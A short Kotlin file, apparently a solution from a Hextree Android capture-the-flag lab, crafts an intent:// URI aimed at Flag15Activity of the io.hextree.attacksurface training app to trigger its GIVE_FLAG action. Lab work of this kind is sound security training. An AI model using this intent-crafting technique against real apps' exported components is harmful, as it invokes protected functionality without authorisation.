package com.pachinko.intentattacksurface.utils

import android.content.Context
import android.content.Intent
import androidx.core.net.toUri

object Flag15 {
    fun getFlag(context: Context) {
        val intent = Intent().apply {
            data = "intent://ad/#Intent;package=io.hextree.attacksurface;component=io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag15Activity;action=io.hextree.action.GIVE_FLAG;end".toUri()
        }
        context.startActivity(intent)
    }
}
